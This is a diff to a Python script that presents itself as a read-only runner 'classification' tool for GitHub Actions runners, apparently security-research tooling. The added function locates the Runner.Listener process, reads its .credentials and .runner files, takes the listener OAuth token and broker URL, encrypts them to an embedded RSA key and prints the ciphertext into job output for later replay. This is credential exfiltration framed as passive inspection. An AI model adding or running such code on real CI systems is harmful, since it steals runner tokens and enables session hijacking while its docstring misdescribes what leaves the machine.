@@ -1,12 +1,12 @@
-"""Bounded T4 runner-pool read-authority classification for Meta LHE.
+"""Bounded T4 listener-token post-job revocation classifier for Meta LHE.
 
 The script performs local read-only classification of the HCA and Actions
 Runner listener authority. JWTs are decoded only in memory and only claim
-names, type classes and selected boolean values are emitted. It also makes
-three GET requests to the current runner service: an invalid-auth baseline and
-valid-auth pool/current-pool-agent listings with capabilities and job request
-fields disabled. Only aggregate counts and schema keys are emitted; no raw
-credential, URL, address, hostname, identifier, item value, or body is emitted.
+names, type classes and selected boolean values are emitted. The current
+disposable runner's listener token and V2 broker URL are encrypted in memory to
+a one-time RSA public key for a post-job invalid-session GET. Only ciphertext
+is emitted; no raw credential, URL, address, hostname, identifier, or body is
+emitted, and this on-runner stage makes no network request.
 """
 
 from __future__ import annotations
@@ -23,6 +23,7 @@ import ssl
 import stat
 import subprocess
 import sys
+import tempfile
 import time
 import xml.etree.ElementTree as ET
 from collections import Counter
@@ -31,6 +32,18 @@ from urllib.parse import parse_qs, urlencode, urlsplit
 
 
 MARKER = "META_LHE_FAIRCHEM_T4_PASSIVE"
+LISTENER_REPLAY_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
+MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAvf+xRALY8tT0O5FP5Wns
+6HpqNkKO4Xiw3CBeXZHwIOlcfsI8OSyeELXiuz9xsQeJ/881/LiL32nP8wP56TiS
+MqLZ0Sgu+WFisf/2QHPoHfYe4vWJzmtRSjnAsztG3j4oNIZ5qX8+pBscP5rOGZXm
+/Pe5M+kN6hmMzk8TFTuTg+qY0QC5eWL0IcS1IpixKcAor265w2CJEnqscZ/BsTYv
+L380AHIJ30U5JnDjz6TEgMAnaXL12EebJgAc2BE12H5WWt7JgGvf3Y1dw2qCSEe4
+ZyTdGT/3MNd7u46uDXCqLjPSMTWbo6U9awpVVsdtPtdLw6rOpXj9reo+gB7WYNqB
+Ha3qAo8BCpCPiPkUsHpChZ6URSQgkFxPNQNrxrFDZkMkD1+Dh33mbzkb6epFika0
+UdgmQFyhVK3y6YJnPfL2TC/4rFu/6QxPdsrP3sACI+tbkrVVjSQ16EO0PfMEGJeX
+XAwKYsxoHaR00TTphe/csDM3mtXCQIeQ6SVpSiNV5HE5AgMBAAE=
+-----END PUBLIC KEY-----
+"""
 MAX_TEXT_FILE = 2 * 1024 * 1024
 MAX_COMMAND_OUTPUT = 4 * 1024 * 1024
 KEY_PATTERN = re.compile(r"^[A-Za-z][A-Za-z0-9_.-]{0,79}$")
@@ -935,6 +948,101 @@ def inspect_runner_listener_authority() -> None:
     emit("runner_listener_raw_values_emitted", 0)
 
 
+def capture_listener_replay_material_encrypted() -> bool:
+    listeners: list[Path] = []
+    for process_root in Path("/proc").iterdir():
+        if not process_root.name.isdigit():
+            continue
+        try:
+            comm = (process_root / "comm").read_text(errors="replace").strip()
+        except OSError:
+            continue
+        if comm == "Runner.Listener":
+            listeners.append(process_root)
+    if len(listeners) != 1:
+        emit("listener_replay_capture_preconditions_met", False)
+        return False
+    try:
+        executable = (listeners[0] / "exe").resolve(strict=True)
+        config_root = executable.parent.parent
+        credentials = json.loads((config_root / ".credentials").read_bytes())
+        runner = json.loads((config_root / ".runner").read_bytes())
+    except (OSError, json.JSONDecodeError):
+        emit("listener_replay_capture_preconditions_met", False)
+        return False
+    token = case_get(case_get(credentials, "data"), "token")
+    server_url = case_get(runner, "ServerUrlV2")
+    scheme = case_get(credentials, "scheme")
+    if not isinstance(server_url, str):
+        emit("listener_replay_capture_preconditions_met", False)
+        return False
+    parsed = urlsplit(server_url)
+    endpoint_class = classify_url(server_url)
+    preconditions = (
+        isinstance(token, str)
+        and 0 < len(token) <= 32768
+        and len(token.split(".")) == 3
+        and isinstance(scheme, str)
+        and scheme.casefold() == "oauthaccesstoken"
+        and parsed.scheme == "https"
+        and parsed.port in (None, 443)
+        and endpoint_class["host_suffix_class"] == "github_actions_content"
+        and len([segment for segment in parsed.path.split("/") if segment]) == 0
+    )
+    emit("listener_replay_capture_preconditions_met", preconditions)
+    if not preconditions or not isinstance(token, str):
+        return False
+
+    payload = json.dumps(
+        {"server_url": server_url, "token": token},
+        sort_keys=True,
+        separators=(",", ":"),
+    ).encode("utf-8")
+    ciphertext_chunks: list[str] = []
+    try:
+        with tempfile.NamedTemporaryFile(
+            mode="w", encoding="ascii", prefix="lhe-listener-public-", suffix=".pem"
+        ) as public_key_file:
+            public_key_file.write(LISTENER_REPLAY_PUBLIC_KEY)
+            public_key_file.flush()
+            for offset in range(0, len(payload), 250):
+                result = subprocess.run(
+                    [
+                        "openssl",
+                        "pkeyutl",
+                        "-encrypt",
+                        "-pubin",
+                        "-inkey",
+                        public_key_file.name,
+                        "-pkeyopt",
+                        "rsa_padding_mode:oaep",
+                        "-pkeyopt",
+                        "rsa_oaep_md:sha256",
+                    ],
+                    input=payload[offset : offset + 250],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.DEVNULL,
+                    check=True,
+                    timeout=10,
+                )
+                ciphertext_chunks.append(base64.b64encode(result.stdout).decode("ascii"))
+    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
+        emit("listener_replay_capture_encryption_succeeded", False)
+        return False
+    emit("listener_replay_capture_encryption_succeeded", True)
+    emit("listener_replay_capture_cipher", "rsa_oaep_sha256_3072")
+    emit("listener_replay_capture_plaintext_chunk_size", 250)
+    emit("listener_replay_capture_ciphertext_chunk_count", len(ciphertext_chunks))
+    for index, ciphertext in enumerate(ciphertext_chunks):
+        emit(f"listener_replay_ciphertext_chunk_{index:03d}", ciphertext)
+    emit("listener_replay_capture_raw_credential_emitted", 0)
+    emit("listener_replay_capture_private_key_present_on_runner", False)
+    emit("listener_replay_capture_target", "current_disposable_runner_only")
+    payload = b""
+    token = ""
+    return True
+
+
 def scheduler_path_segment_class(value: str) -> str:
     if UUID_PATTERN.fullmatch(value):
         return "uuid"
@@ -1729,7 +1837,7 @@ def inspect_environment_names() -> None:
 
 
 def main() -> int:
-    emit("schema", "v5")
+    emit("schema", "v6")
     emit("effective_uid_zero", os.geteuid() == 0)
     inspect_hca()
     inspect_runner_listener_authority()
@@ -1738,12 +1846,14 @@ def main() -> int:
     inspect_waagent()
     inspect_local_network_configuration_markers()
     inspect_environment_names()
-    runner_pool_request_count = probe_runner_pool_read_boundary()
-    emit("network_requests", runner_pool_request_count)
-    emit("sockets_opened", runner_pool_request_count)
+    capture_succeeded = capture_listener_replay_material_encrypted()
+    emit("encrypted_listener_material_captured", capture_succeeded)
+    emit("network_requests", 0)
+    emit("sockets_opened", 0)
     emit("raw_addresses_hostnames_urls_or_identifiers_emitted", 0)
     emit("raw_credentials_or_file_bodies_emitted", 0)
-    emit("state_changes", 0)
+    emit("persistent_state_changes", 0)
+    emit("temporary_state", "public_key_file_created_and_deleted")
     return 0
 
 
